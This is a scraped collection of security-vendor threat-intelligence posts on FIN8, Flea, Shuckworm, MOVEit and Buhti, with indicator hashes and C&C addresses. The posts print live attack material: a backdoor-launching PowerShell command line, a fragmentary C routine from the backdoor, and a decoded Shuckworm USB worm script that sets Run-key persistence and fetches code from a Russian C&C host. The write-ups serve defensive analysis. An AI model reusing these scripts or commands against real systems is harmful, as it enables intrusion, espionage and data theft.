cmd.exe /Q /c powershell -nop -ep bypass -c CSIDL_SYSTEM_DRIVE\\shvnc.ps1 1> \\\\127.0.0.1\\ADMIN$\\__1671129123.2520242 2>&1 This new backdoor was used by the attackers for the next few hours. Interestingly, the new backdoor PowerShell script uses a new file name and simplifies the command-line by removing the decryption key argument. Switching the tools like this could indicate that the attackers are testing new features, so we were curious to analyze this new sample in detail. One difference between the attack described by Bitdefender and the recent attacks observed by Symantec is the technique used to deploy the backdoor. In our case, the backdoor is embedded (indirectly) into a PowerShell script (see Figure 1) used to infect target machines, while the variant documented by Bitdefender features intermediate downloader shellcode that downloads and executes the backdoor. The PowerShell script used by Syssphinx can be seen in Figure 2. The intention of the first line of code is to delete the PowerShell script file itself. The second line checks the architecture of the current process and picks the 32-bit or 64-bit version of the encoded .NET Loader as appropriate. The third line decodes the .NET Loader binary and loads it into the current process. Finally, the fourth line of code starts the main functionality of the .NET Loader, where the injector and backdoor are decrypted and control is passed to the injector. The .NET Loader is an obfuscated .NET DLL. The obfuscation manifests certain ConfuserEx features. The .NET Loader contains two blobs, which it first decrypts with the RC4 algorithm using a hardcoded decryption key before decompressing. The decompressed blobs are then copied into a continuous chunk of memory. The .NET Loader then transfers control to the second blob (injector), passing the memory location and size of the first blob (backdoor) as parameters. The injector is in the form of shellcode and its entrypoint is shown in Figure 3. The decrypt_dwords subroutine seen in Figure 3 decrypts a few dwords (marked as encrypted_dwords in Figure 3) to reveal a short chunk of code. The revealed code is shown in Figure 4 and includes a decryption loop that looks similar to the “shellcode decryption routine” described in Bitdefender’s report. After the decryption loop completes execution, we can see the full logic of the entrypoint (Figure 5). The purpose of the injector is to start the backdoor in a newly created WmiPrvSE.exe process. When creating the WmiPrvSE.exe process, the injector attempts to start it in session-0 (best effort) using a token stolen from the lsass.exe process. The Backdoor is also in the form of shellcode and its entrypoint looks similar to that of the injector entrypoint, with the exception of polymorphism. One of the interesting features of the backdoor is related to interactive sessions, where the attacker runs cmd.exe or other interactive processes on the affected computer. Interestingly, the sample allows up to 10 such sessions to run at the same time. In addition, when starting each individual process, the attacker may use a process token stolen from a specified process ID that is different for each session. Another notable feature is that the backdoor supports three different formats to extend its functionality. The first is with PE DLL plugins that the backdoor loads within its own process and then calls: The second format supported by the backdoor is in the form of shellcode, where each shellcode plugin executes in its own dedicated process. Before starting the shellcode, the backdoor creates a new process and writes into its memory the shellcode blob preceded by a simple structure storing a copy of arguments received from the remote attacker. It then uses the QueueUserAPC API to execute the shellcode, such that the address of the mentioned structure is passed as the first and only shellcode argument. To unload any shellcode plugin, the backdoor simply terminates the process associated with the specified plugin. Finally, the third format is also in the form of shellcode but with a different convention to pass the arguments. The backdoor executes this shellcode in the context of the backdoor's main thread and no other commands are accepted until the shellcode returns. To execute the shellcode, the backdoor simply calls it as a subroutine passing four arguments, each providing the address of the corresponding argument received from the remote attacker (the backdoor appears to use 64-bit values when passing the addresses in case of 32-bit shellcode). Network communication When communicating with its command-and-control (C&C) server, the backdoor exchanges messages of variable size using the structure shown in Table 1. The size of body field (body_size) can be determined from the content of the header field as explained in the following sections. Once the backdoor connects to its C&C server, it sends the initial message of 0x10C bytes with: The body field of the initial message is 0x100 bytes and uses the structure shown in Table 2. The size of rc4_key filed (rc4_key_size) is always 0x40 bytes. The snippet shown below roughly demonstrates the method used by the backdoor to generate the infection_id. uint16_t sum_words(void *data, size_t size) uint16_t *words = data; while (size >= sizeof(*words)) { size -= sizeof(*words); void mix(char *identifier, size_t identifier_size, char *seed, size_t seed_length) const char hex_digits[] = \"0123456789ABCDEF\"; for (size_t position = 1; position < identifier_size; position += 2) { int value = index * ~( seed[(index - 1) % seed_length] + seed[(index % identifier_size) % seed_length] + seed[((index + 1) % identifier_size) % seed_length] + seed[((index + 2) % identifier_size) % seed_length] identifier[position - 1] = hex_digits[(value >> 4) & 0x0f]; identifier[position] = hex_digits[value & 0x0f]; void generate_infection_id(char *infection_id, size_t infection_id_size) CHAR computer_name[0x400] = {}; DWORD computer_name_size = sizeof(computer_name); GetComputerNameA(computer_name, &computer_name_size); int cpu_info[4] = {}; __cpuid(cpu_info, 0); DWORD volume_serial_number = 0; GetVolumeInformationA(\"c:\\\\\", 0, 0, &volume_serial_number, 0, 0, 0, 0); size_t seed_length = snprintf(seed, sizeof(seed), \"%s%hu%hu\", sum_words(cpu_info, sizeof(cpu_info)), sum_words(&volume_serial_number, sizeof(volume_serial_number))); mix(infection_id, infection_id_size, seed, seed_length); For all the communication that follows (incoming and outgoing), the backdoor uses the following method to determine the size of the body field (body_size): The content of body and footer fields is encrypted with the RC4 algorithm using rc4_key as the encryption key. The keystream is reused when encrypting each individual field. The footer field is 8 bytes and, once decrypted, uses the structure shown in Table 3. Finally, the structure of the decrypted body field varies depending on the message_type. The backdoor has the ability to receive and carry out the commands listed in Table 4. Syssphinx continues to develop and improve its capabilities and malware delivery infrastructure, periodically refining its tools and tactics to avoid detection. The group’s decision to expand from point-of-sale attacks to the deployment of ransomware demonstrates the threat actors’ dedication to maximizing profits from victim organizations. The tools and tactics detailed in this report serve to underscore how this highly skilled financial threat actor remains a serious threat to organizations. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. 1d3e573d432ef094fba33f615aa0564feffa99853af77e10367f54dc6df95509 – PowerShell script 307c3e23a4ba65749e49932c03d5d3eb58d133bc6623c436756e48de68b9cc45 – Hacktool.Mimikatz 48e3add1881d60e0f6a036cfdb24426266f23f624a4cd57b8ea945e9ca98e6fd – DLL file 4db89c39db14f4d9f76d06c50fef2d9282e83c03e8c948a863b58dedc43edd31 – 32-bit shellcode 356adc348e9a28fc760e75029839da5d374d11db5e41a74147a263290ae77501 – 32-bit shellcode e7175ae2e0f0279fe3c4d5fc33e77b2bea51e0a7ad29f458b609afca0ab62b0b – 32-bit shellcode e4e3a4f1c87ff79f99f42b5bbe9727481d43d68582799309785c95d1d0de789a – 64-bit shellcode 2cd2e79e18849b882ba40a1f3f432a24e3c146bb52137c7543806f22c617d62c – 64-bit shellcode 78109d8e0fbe32ae7ec7c8d1c16e21bec0a0da3d58d98b6b266fbc53bb5bc00e – 64-bit shellcode ede6ca7c3c3aedeb70e8504e1df70988263aab60ac664d03995bce645dff0935 5b8b732d0bb708aa51ac7f8a4ff5ca5ea99a84112b8b22d13674da7a8ca18c28 4e73e9a546e334f0aee8da7d191c56d25e6360ba7a79dc02fe93efbd41ff7aa4 05236172591d843b15987de2243ff1bfb41c7b959d7c917949a7533ed60aafd9 edfd3ae4def3ddffb37bad3424eb73c17e156ba5f63fd1d651df2f5b8e34a6c7 827448cf3c7ddc67dca6618f4c8b1197ee2abe3526e27052d09948da2bc500ea 0e11a050369010683a7ed6a51f5ec320cd885128804713bb9df0e056e29dc3b0 0980aa80e52cc18e7b3909a0173a9efb60f9d406993d26fe3af35870ef1604d0 64f8ac7b3b28d763f0a8f6cdb4ce1e5e3892b0338c9240f27057dd9e087e3111 2d39a58887026b99176eb16c1bba4f6971c985ac9acbd9e2747dd0620548aaf3 8cfb05cde6af3cf4e0cb025faa597c2641a4ab372268823a29baef37c6c45946 72fd2f51f36ba6c842fdc801464a49dce28bd851589c7401f64bbc4f1a468b1a 6cba6d8a1a73572a1a49372c9b7adfa471a3a1302dc71c4547685bcbb1eda432 37.10.71[.]215 – C&C server 104-168-237-21.sslip[.]io The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/syssphinx-fin8-backdoor"
  },
  {
    "title": "microsoft zeroday exploit",
    "content": "A zero-day vulnerability (CVE-2023-36884) affecting Microsoft Windows and Office products is being exploited by attackers in the wild. To date, the exploit has been used in highly targeted attacks against organizations in the government and defense sectors in Europe and North America. The vulnerabilitywas disclosed yesterday (July 11) by Microsoft, which said that an attacker could create a specially crafted Microsoft Office document that enables remote code execution on the target’s computer. In order for the exploit to succeed, the victim needs to open the malicious file. No patch has been released yet for the vulnerability. However, Microsoft is still investigating the issue and said a patch may be rolled out in its monthly release process or in an out-of-cycle security update. The company provided some mitigation guidance in its advisory. How is the vulnerability being exploited? According to aseparate blog published by Microsoft, the vulnerability was being exploited by an actor it calls Storm-0978 (aka RomCom) in targeted attacks against defense and government organizations in Europe and North America. The exploit was contained in Microsoft Word documents that masqueraded as information about the Ukrainian World Congress. The attacks wereearlier documented by BlackBerryon July 8, which noted that the targets were guests for the upcoming NATO Summit. At the time, the use of the zero-day in the attacks was unknown. Who is Storm-0978/RomCom? Storm-0978/RomCom is a Russia-linked threat actor that has been involved in both espionage and cyber-crime activity. The group acquired its name through its use of the RomCom remote access Trojan (RAT). There are strong ties between it and a group Symantec calls Hawker, which is the developer of the Cuba ransomware family. TheU.S Cybersecurity and Infrastructure Security Agency (CISA) has saidthat there are possibly links between Hawker, RomCom, and the Industrial Spy ransomware actors. Areport published last year by Palo Altoalso detailed how RomCom (whom it calls Tropical Scorpius) used the RomCom RAT to deliver the Cuba ransomware payload to victims. While it is clear that there are strong ties between Storm-0978/RomCom and Hawker, it is unclear yet whether the two actors are one and the same. How severe is this vulnerability? Until a patch is released, organizations should adopt all possible mitigation strategies. Although the vulnerability has, to date, been exploited in targeted attacks, news of its existence will doubtlessly lead other attackers to attempt to replicate the exploit. Symantec is continuing to investigate further possible protection based on available information, and additional signatures may be introduced as analysis progresses. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. a61b2eafcf39715031357df6b01e85e0d1ea2e8ee1dfec241b114e18f7a1163f e7cfeb023c3160a7366f209a16a6f6ea5a0bc9a3ddc16c6cba758114dfe6b539 d3263cc3eff826431c2016aee674c7e3e5329bebfb7a145907de39a279859f4a 3a3138c5add59d2172ad33bc6761f2f82ba344f3d03a2269c623f22c1a35df97 The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/microsoft-zeroday-exploit"
  },
  {
    "title": "flea backdoor microsoft graph apt15",
    "content": "The Flea (aka APT15, Nickel) advanced persistent threat (APT) group continued to focus on foreign ministries in a recent attack campaign that ran from late 2022 into early 2023 in which it leveraged a new backdoor called Backdoor.Graphican. This campaign was primarily focused on foreign affairs ministries in the Americas, although the group also targeted a government finance department in a country in the Americas and a corporation that sells products in Central and South America. There was also one victim based in a European country, which was something of an outlier. This victim had also previously suffered a seemingly unrelated ransomware attack in July 2022. However, the primary focus of the campaign observed by the Threat Hunter Team at Symantec, part of Broadcom, does appear to be on ministries of foreign affairs in the Americas. Flea has a track record of honing in on government targets, diplomatic missions, and embassies, likely for intelligence-gathering purposes. Flea used a large number of tools in this campaign. As well as the new Graphican backdoor, the attackers leveraged a variety of living-off-the-land tools, as well as tools that have been previously linked to Flea. We will detail these tools in this section. Graphican is an evolution of the known Flea backdoor Ketrican, which itself was based on a previous malware — BS2005 — also used by Flea. Graphican has the same basic functionality as Ketrican, with the difference between them being Graphican’s use of the Microsoft Graph API and OneDrive to obtain its command-and-control (C&C) infrastructure. This technique was used in a similar way by the Russian state-sponsored APT groupSwallowtail (aka APT28, Fancy Bear, Sofacy, Strontium) in a campaign in 2022in which it delivered the Graphite malware. In that campaign, the Graphite malware used the Microsoft Graph API and OneDrive as a C&C server. The observed Graphican samples did not have a hardcoded C&C server, rather they connected to OneDrive via the Microsoft Graph API to get the encrypted C&C server address from a child folder inside the \"Person\" folder. The malware then decoded the folder name and used it as a C&C server for the malware. All instances of this variant used the same parameters to authenticate to the Microsoft Graph API. We can assume they all have the same C&C, which can be dynamically changed by the threat actors. Once on a machine, Graphican does the following: Commands that can be executed by Graphican include: During the course of this campaign, we also observed an updated version of Ketrican, which had a hardcoded C&C server and only implemented the ‘C’, ‘U’, and ‘D’ commands. We also saw an older version of Ketrican (compiled in 2020) that implemented only the ‘N’ and ‘P’ commands. This demonstrates that the group is actively developing and adapting Ketrican to suit its objectives. Other tools leveraged by Flea in this recent activity include: Flea has been in operation since at least 2004. Over that time its tactics, techniques, and procedures (TTPs), as well as its targeting, have changed and developed. In recent years, the group has primarily focused on attacks against government organizations, diplomatic entities, and non-governmental organizations (NGOs) for the purposes of intelligence gathering. North and South America does appear to have become more of a focus for the group in recent times, which aligns with the targeting we saw in this campaign. The goal of the group does seem to be to gain persistent access to the networks of victims of interest for the purposes of intelligence gathering. Its targets in this campaign, of ministries of foreign affairs, also point to a likely geo-political motive behind the campaign. Flea traditionally used email as an initial infection vector, but there have also been reports of it exploiting public-facing applications, as well as using VPNs, to gain initial access to victim networks. Microsoft seized domains belonging to Fleain December 2021. The company seized 42 domains that it said were used in operations that targeted organizations in the U.S. and 28 other countries for intelligence-gathering purposes. Flea was also linked in a November 2022 report by Lookout to along-running campaign targeting Uyghur-language websites and social mediain China. Flea is believed to be a large and well-resourced group, and it appears that exposure of its activity, and even takedowns such as that detailed by Microsoft, have failed to have a significant impact when it comes to stopping the group’s activity. The use of a new backdoor by Flea shows that this group, despite its long years of operation, continues to actively develop new tools. The group has developed multiple custom tools over the years. The similarities in functionality between Graphican and the known Ketrican backdoor may indicate that the group is not very concerned about having activity attributed to it. The most noteworthy thing about Graphican itself is the abuse of the Microsoft Graph API and OneDrive to obtain its C&C server. The fact that a similar technique was used by Swallowtail, an unconnected APT group operating out of a different region, is also worth noting. Once a technique is used by one threat actor, we often see other groups follow suit, so it will be interesting to see if this technique is something we see being adopted more widely by other APT groups and cyber criminals. Flea’s targets — foreign ministries — are also interesting; though they do align with the targets the group has directed its activity at in the past. It appears the Flea’s interests remain similar to what they have been in recent years, even as its tools and techniques continue to evolve. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/flea-backdoor-microsoft-graph-apt15"
  },
  {
    "title": "shuckworm russia ukraine military",
    "content": "The Shuckworm espionage group is continuing to mount multiple cyber attacks against Ukraine, with recent targets including security services, military, and government organizations. In some cases, Shuckworm has succeeded in staging long-running intrusions, lasting for as long as three months. The attackers repeatedly attempted to access and steal sensitive information such as reports about the deaths of Ukrainian military service members, enemy engagements and air strikes, arsenal inventories, military training, and more. In a bid to stay ahead of detection, Shuckworm has repeatedly refreshed its toolset, rolling out new versions of known tools and short-lived infrastructure, along with new additions, such as USB propagation malware. Shuckworm (aka Gamaredon, Armageddon) is a Russia-linked group that has almost exclusively focused its operations on Ukraine since it first appeared in 2014. Ukrainian officials have publicly stated that the group operates on behalf of the Russian Federal Security Service (FSB). Shuckworm is known to use phishing emails as an initial infection vector, in order to gain access to victim machines and distribute malware. The attackers send emails with malicious attachments to Ukrainian victims, with the attachments of various file types, such as: The victim lures we observed related to armed conflicts, criminal proceedings, combating crime, and protection of children, among others. Once victims were infected, the attackers then proceed to download additional backdoors and tools onto targeted machines. Shuckworm has also been observed using a new PowerShell script in order to spread its custom backdoor malware, Pterodo, via USB. Researchers from Symantec, part of Broadcom,blogged about Backdoor.Pterodo in April 2022, documenting how we had found four variants of the backdoor with similar functionality. The variants are Visual Basic Script (VBS) droppers that will drop a VBScript file, use Scheduled Tasks (shtasks.exe) to maintain persistence, and download additional code from a command-and-control (C&C) server. Examples of recent scheduled tasks include execution of the following command lines: The new PowerShell script is used to first copy itself onto the infected machine and create a shortcut file using anrtk.lnkextension. The script uses file names such as “porn_video.rtf.lnk”, “do_not_delete.rtf.lnk”” and “evidence.rtf.lnk” in an attempt to entice individuals to open the files. These file names are generally in Ukrainian, but some are also in English. Next, the script enumerates all drives, copying itself to any available removable disks – USB drives. These USB drives are likely used by the attackers for lateral movement across victim networks and may be used to help the attackers reach air-gapped machines within targeted organizations. In this recent activity, we also observed the group leveraging legitimate services to act as C&C servers, including using the Telegram messaging service for its C&C infrastructure. More recently, they have also used Telegram’s micro-blogging platform, called Telegraph, to store C&C addresses. Shuckworm tends to only use its C&C infrastructure for short periods of time, limiting the usefulness of its C&Cs when it comes to finding more activity or linking activity together. However, the group does use SSL certificates that have some commonalities that may be leveraged for tracking purposes. We believe the group is likely leveraging pre-configured images for use in its C&C deployment. These data points can help researchers to identify additional C&C infrastructure and Shuckworm activity. Symantec also saw what was likely Giddome, an infostealer tool that is a known Shuckworm backdoor, deployed onto victim networks to steal and exfiltrate data of interest. The following describes a typical attack chain seen on a victim machine compromised by Shuckworm in this campaign. In one attack, the first sign of malicious activity was when the user appeared to open a RAR archive file that was likely delivered via a spear-phishing email and which contained a malicious document. After the document was opened, a malicious PowerShell command was observed being executed to download the next-stage payload from the attackers’ C&C server: More recently, Symantec has observed Shuckworm leveraging more IP addresses in their PowerShell scripts. This is likely an attempt to evade some tracking methods employed by researchers. Shuckworm also continues to update the obfuscation techniques used in its PowerShell scripts in an attempt to avoid detection, with up to 25 new variants of the group’s scripts observed per month between January and April 2023. Next, a VBS script, which was Shuckworm’s Pterodo backdoor, was executed: Following this, we saw what appeared to be multiple similar scripts being executed. The machine used for this activity appeared to contain multiple confidential documents related to Ukrainian security services or government departments. On a different machine, we saw malicious activity that appeared to be executed from a file (foto.safe) that had been dropped by an infected USB key that someone had plugged into the system. Symantec observed multiple file paths present on infected machines that indicate users had plugged in an infected USB key e.g. \"usb-накопитель\" translates as \"usb-drive\". The foto.safe file is a Base64-encoded script. Decoded it looks like the following: fUNCtIon sET-lnK ($chILd) { $nAMetxt = \"foto.sAfe\".TolowER(); $NAmE = (\"кОМПРОМат\", \"КОРЗиНА\", \"СеКРетнО\" | GeT-rAnDOm).ToUPPeR(); $WSHSHELl = NEw-obJeCT -CoMObjeCT WSCriPT.shELL; $sHORTcut = $wShShEll.CREatesHoRTCUt($cHild +\"\\$nAMe.LNK\"); $shoRtCuT.iConloCaTiON = \"C:\\wiNDoWS\\SysteM32\\SHELL32.DLL,3\"; $SHOrTcUT.TArGetpAth = \"c:\\wInDOwS\\sYstEm32\\WInDOwSpowERshell\\V1.0\\POwERShEll.ExE\".ToLoweR(); $text = \"-wInDoWsTYlE hidDeN -nolOgo Iex (IeX (GeT-cOnTent .\\$NAMetxt | OUT-STrIng))\".TOlower(); $sHORTCUT.ArGUMEnTs = $tExt; $mYfIlE= $chIlD+\"\\$naMeTXT\" cOPY-Item $enV:UsErprOfilE\\iNdEx.phP -deSTINAtION $mYfILE $FIlE=GEt-ITEM $mYfiLE -forCe $FiLe.ATtRiButes='hiDDEN' Set-ITemPRoPERTY -pAth HkCU:\\soFTWare\\MicROsOfT\\WiNDows\\cURRENtVerSiON\\ruN -NAME safE -valUE $env:windir'\\sYSTeM32\\wINDoWSPowErSHEll\\v1.0\\pOwERShell.eXE -WIndowSTYlE hiddEN -noLOgO inVOkE-ExpREsSIOn (get-contEnT $eNV:usERPRoFILe\\INdEX.PHp | Out-sTRing) | poweRSHeLL -noPROfILE'; coPy-item  .\\\"fOtO.safe\"  -dEsTInaTioN $Env:USeRprOFIle\\iNdEX.pHp $urLs = 'hTTP://'+ [SYSTEM.NEt.DnS]::geThostadDREsSes([String]$(GEt-random)+'.cOriDAS.Ru') +'/slEEP.Php'; iEX $(New-ObJeCt Net.WEBClient).uPloAdStRING($uRls.ToloWER(),'') $drIVE = GeT-wmIoBJeCt WIN32_VOluME -fILTer \"drIvETYPe='2'\"; $Drive.naMe | FOreaCH-oBJecT{ $CHiLdS = GET-ChilDITem $drivE.nAMe foReach($cHilDs IN $chiLDs) if( [SYsTEM.io.fiLE]::GetAttributES($ChilDS.FuLlnAMe) -eq [SYsTEM.Io.fILeaTTrIbuTES]::DIRecToRy ) sET-lnk $chILds.fUlLName IF(($dRIVe.CapaCITY - $DriVe.fREeSPACE) -Gt 1000000){ This PowerShell script is used to copy itself onto the infected machine and then create a shortcut file that links to the PowerShell script. Symantec has identified multiple variants of this script that can be used to indicate successful infection, or to download additional tools onto infected machines. One of the most significant things about this campaign is the targets, which include Ukrainian military, security, research, and government organizations. The attackers were observed focusing on machines that contained what appeared from file names to be sensitive military information that may be abused to support Russian kinetic war efforts. The majority of these attacks began in February/March 2023, with the attackers maintaining a presence on some of the victim machines until May. The sectors and nature of the organizations and machines targeted may have given the attackers access to significant amounts of sensitive information. There were indications in some organizations that the attackers were on the machines of the organizations’ human resources departments, indicating that information about individuals working at the various organizations was a priority for the attackers, among other things. This activity demonstrates that Shuckworm’s relentless focus on Ukraine continues. It seems clear that Russian nation-state-backed attack groups continue to prioritize high-value Ukrainian targets in attempts to find data that may potentially help their military operations. For the latest protection updates, please visit theSymantec Protection Bulletin. USB propagation scripts Example of LNK files created Recent C&C infrastructure (2023) The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/shuckworm-russia-ukraine-military"
  },
  {
    "title": "moveit vulnerabilities exploits",
    "content": "Extortion actors have been actively exploiting a recently patched vulnerability in MOVEit Transfer, a file-transfer application that is widely used to transmit information between organizations. The nature of the software affected means that attackers can exploit unpatched systems to mount a supply chain attack against multiple organizations. While the original vulnerability (CVE-2023-34362) was patched on May 31, MOVEit Transfer’s developersannounced on Friday (June 9)that multiple additional vulnerabilities (CVEs pending) have also been identified and patched. Prior to its patching, attackers linked to the Clop ransomware operation were already exploiting CVE-2023-34362 as a zero-day vulnerability. Proof-of-concept code for the exploit is now publicly available, meaning other attackers are now likely to attempt to exploit unpatched systems. What is MOVEit Transfer? MOVEit Transfer is a managed file-transfer application developed by Progress Software. It is designed to permit secure transfer of files between businesses and their customers. What is the nature of the vulnerability? The original vulnerability (CVE-2023-34362) occurs in the MOVEit Transfer web application. It affected all versions prior to 2021.0.6 (13.0.6), 2021.1.4 (13.1.4), 2022.0.4 (14.0.4), 2022.1.5 (14.1.5), and 2023.0.1 (15.0.1). “[An] attacker may be able to infer information about the structure and contents of the database in addition to executing SQL statements that alter or delete database elements,” Progress said. For how long was the vulnerability being exploited before it was patched? According to a U.S. government advisory, active exploitation appears to have begun on May 27, 2023. How has the vulnerability been exploited to date? The vulnerability is being actively exploited by the Clop ransomware operation. According toa joint advisory issued by the U.S. Federal Bureau of Investigation (FBI) and the Cybersecurity and Infrastructure Security Agency (CISA), the attackers exploited the vulnerability to install a web shell called Lemurloot (JS.Malscript!g1) on affected systems. This was then used to steal data from underlying databases. Lemurloot was designed specifically to target the MOVEit Transfer platform. It authenticates incoming HTTPS requests via a hard-coded password; runs commands that will download files from the MOVEit Transfer database; extracts its Azure system settings; retrieves records; and can create, insert, or delete a particular user. When responding to a request, Lemurloot returns stolen data in a comfile format. Shortly after the disclosure of the vulnerability, attackers linked to the Clop ransomware operationclaimed responsibility for the attackand said that they had stolen data from multiple MOVEit users and their customers. It threatened to release the stolen data unless a ransom is paid. What is known about Clop? Clop is an extortion and ransomware operation run by a cyber-crime group known as Snakefly (aka TA505, FIN11). While the group initially extorted victims by encrypting files using its own ransomware payload (Ransom.Clop), in recent times it has been known to eschew encryption entirely and rely on the threat of leaking stolen data to extort its victims. The group has a track record in exploiting zero-day vulnerabilities. In 2021, it was linked to theexploitation of multiple vulnerabilities in Accellion FTA, another file-transfer application. Earlier this year it was responsible for exploiting a zero-day vulnerability (CVE-2023-0669) in the GoAnywhere MFT platform. How do Symantec products guard against exploitation of this vulnerability? Symantec products will guard against exploit attempts and payloads with the following detections: Machine learning-based Data Center Security (DCS) default hardening policies such as sym_win_hardened_sbp provide 0-day protection for CVE-2023-34362. DCS policy control \"Software Install Restrictions\" for MS SQL, MS IIS and other hardened application sandboxes stop Clop ransomware from exploiting this vulnerability by preventing arbitrary deployment of webshells and unauthorized software. Observed domains/IPs are covered under security categories. For the latest protection updates, please visit theSymantec Protection Bulletin. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/moveit-vulnerabilities-exploits"
  },
  {
    "title": "buhti ransomware",
    "content": "A relatively new ransomware operation calling itself Buhti appears to be eschewing developing its own payload and is instead utilizing variants of the leaked LockBit and Babuk ransomware families to attack Windows and Linux systems. While the group doesn’t develop its own ransomware, it does utilize what appears to be one custom-developed tool, an information stealer designed to search for and archive specified file types. Buhti, which first came to public attention in February 2023, was initially reported to be attacking Linux computers. However, Symantec’s Threat Hunter Team has also uncovered attempts to attack Windows computers on compromised networks. The group appears to be quick to exploit recently disclosed vulnerabilities, with one recent attack exploiting the recently patched PaperCut vulnerability. Since Buhti hasn’t been linked to any known cyber-crime group, Symantec has assigned the actor name Blacktail to its operators. A recent Buhti attack saw the attackers attempt to deploy a ransomware payload against Windows computers on the targeted network. Analysis of the payload revealed that it was a minimally modified version of the leaked LockBit 3.0 (aka LockBit Black) ransomware. Encrypted files are appended with a .buthi extension. The ransom note can be seen in Figure 1. The ransomware includes a feature that drops a LockBit-branded .bmp file (Figure 2) and makes it the Windows wallpaper, but this functionality was disabled by the attackers. The ransomware also has the capability to send system information about the infected computer to a command-and-control (C&C) server, but this functionality is also disabled and no C&C server is specified. LockBit 3.0 was developed for the Syrphid cyber-crime group (aka Bitwise Spider), which is the operator of the LockBit ransomware. The builder for the ransomwarewas leaked in September 2022, allegedly by a disgruntled developer. While Buhti came to public attention for targeting Linux machines with a payload written in Golang, analysis by Symantec of multiple Linux payloads found that they were all variants of the leaked Babuk ransomware. Babuk was one of the first ransomware actors to target ESXi systems with a Linux payload. Babuk’s source code was leaked in 2021 and since then has been adopted and reused by multiple ransomware operations. The ransom note dropped by Linux variants was identical to that of the Windows payload; with only the payment address differing. Blacktail does appear to use at least one piece of custom malware, a data-exfiltration tool (SHA256: 9f0c35cc7aab2984d88490afdb515418306146ca72f49edbfbd85244e63cfabd). Written in Golang, it is designed to steal the following file types: .pdf, .php, .png, .ppt, .psd, .rar, .raw, .rtf, .sql, .svg, .swf, .tar, .txt, .wav, .wma, .wmv, .xls, .xml, .yml, .zip, .aiff, .aspx, .docx, .epub, .json, .mpeg, .pptx, .xlsx, .yaml. Copied files are placed into a .zip archive, which is created usingan open source utility called zip. The tool can be configured via command-line arguments to specify both the directory to search for files of interest in and the name of the output archive. The -o argument in the command line specifies the archive to be created. The -d argument specifies the directory to search for files of interest in. For example: CSIDL_WINDOWS\\temp\\xhfw.exe -o CSIDL_WINDOWS\\temp\\output.zip -d CSIDL_PROFILE Recent Buhti attacks exploited a recently discovered vulnerability in PaperCut NG and MF (CVE-2023-27350). The exploit allows an attacker to bypass authentication and remotely execute code. The vulnerability was disclosed and patched by PaperCut on March 15, 2023, and in recent weeks multiple threat actors have begun utilizing the exploit against unpatched systems. The attackers exploited the vulnerability in order to install Cobalt Strike, Meterpreter, Sliver, AnyDesk, and ConnectWise. The tools were leveraged to steal data from, and deliver the ransomware payload to, multiple computers on the targeted network. Blacktail appears quick to utilise new exploits. In February,they were reportedto be exploiting a vulnerability in IBM’s Aspera Faspex file-exchange application (CVE-2022-47986). While the reuse of leaked payloads is often the hallmark of a less-skilled ransomware operation, Blacktail’s general competence in carrying out attacks, coupled with its ability to recognize the utility of newly discovered vulnerabilities, suggests that it is not to be underestimated. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. 063fcedd3089e3cea8a7e07665ae033ba765b51a6dc1e7f54dde66a79c67e1e7 - Buhti (Windows) eda0328bfd45d85f4db5dbb4340f38692175a063b7321b49b2c8ebae3ab2868c - Buhti (Linux) e5d65e826b5379ca47a371505678bca6071f2538f98b5fef9e33b45da9c06206 - Buhti (Linux) d65225dc56d8ff0ea2205829c21b5803fcb03dc57a7e9da5062cbd74e1a6b7d6 - Buhti (Linux) d259be8dc016d8a2d9b89dbd7106e22a1df2164d84f80986baba5e9a51ed4a65 - Buhti (Linux) 8b5c261a2fdaf9637dada7472b1b5dd1d340a47a00fe7c39a79cf836ef77e441 - Buhti (Linux) 898d57b312603f091ff1a28cb2514a05bd9f0eb55ace5d6158cc118d1e37070a - Buhti (Linux) 515777b87d723ebd6ffd5b755d848bb7d7eb50fc85b038cf25d69ca7733bd855 - Buhti (Linux) 4dc407b28474c0b90f0c5173de5c4f1082c827864f045c4571890d967eadd880 - Buhti (Linux) 22e74756935a2720eadacf03dc8fe5e7579f354a6494734e2183095804ef19fe - Buhti (Linux) 18a79c8a97dcfff57e4984aa7e74aa6ded22af8e485e807b34b7654d6cf69eef - Buhti (Linux) 01b09b554c30675cc83d4b087b31f980ba14e9143d387954df484894115f82d4 - Buhti (Linux) 7eabd3ba288284403a9e041a82478d4b6490bc4b333d839cc73fa665b211982c - Buhti (Linux) 287c07d78cafc97fb4b7ef364a228b708d31e8fe8e9b144f7db7d986a1badd52 - Buhti (Linux) 32e815ef045a0975be2372b85449b25bd7a7c5a497c3facc2b54bcffcbb0041c - Cobalt Strike Beacon 5b3627910fe135475e48fd9e0e89e5ad958d3d500a0b1b5917f592dc6503ee72 - Cobalt Strike Beacon d59df9c859ccd76c321d03702f0914debbadc036e168e677c57b9dcc16e980cb - Cobalt Strike Beacon de052ce06fea7ae3d711654bc182d765a3f440d2630e700e642811c89491df72 - Cobalt Strike Beacon 